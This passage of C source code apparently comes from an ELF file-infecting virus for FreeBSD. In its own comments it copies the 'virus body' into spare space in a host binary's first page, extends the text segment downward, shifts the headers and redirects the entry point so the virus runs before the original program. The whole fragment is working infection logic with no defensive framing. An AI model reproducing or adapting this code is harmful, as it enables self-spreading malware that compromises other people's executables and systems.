	/* FreeBSD assumes that ELF Header, PHDR and INTERP fit in first page */
	/* see /sys/kern/imgact_elf.c for details */
	uint32_t t = 0;
	for (i = 0; i < ehdr->e_phnum; i++)
		if (phdr[i].p_type == PT_INTERP) {
			t = phdr[i].p_offset + phdr[i].p_filesz;
			break;
		}
	/* no INTERP, put the virus right after PHDR */
	if (t == 0) 
		t = ehdr->e_phoff + ehdr->e_phnum * sizeof(Elf32_Phdr);

	/* do we have enough space? */
	if ((PAGE_SIZE - t) < g->size)
		goto _unmap;
	/* copy virus body */
	MAKE_HOLE(0, PAGE_SIZE);
	memcpy(m + t, g->self, g->size);
	bzero(m + t + g->size, PAGE_SIZE - g->size);
	/* adjust headers */
	SHIFT_SHDRS(0, PAGE_SIZE);
	for (i = 0; i < ehdr->e_phnum; i++) {
		/* extend text segment downwards */
		if (phdr[i].p_type == PT_LOAD && phdr[i].p_offset == 0) {
			phdr[i].p_vaddr -= PAGE_SIZE;
			phdr[i].p_paddr -= PAGE_SIZE;
			phdr[i].p_filesz+= PAGE_SIZE;
			phdr[i].p_memsz += PAGE_SIZE;
			/* change entry point */
			*(uint32_t*)(m + t + 8) = old_entry - phdr[i].p_vaddr - t - 12;
			ehdr->e_entry = phdr[i].p_vaddr + t;
		} else	/* leave these segments in the beginning... */
		if (phdr[i].p_type == PT_PHDR || phdr[i].p_type == PT_INTERP) {
			phdr[i].p_vaddr -= PAGE_SIZE;
			phdr[i].p_paddr -= PAGE_SIZE;
		} else	/* shift the others */
			phdr[i].p_offset+= PAGE_SIZE;
	}
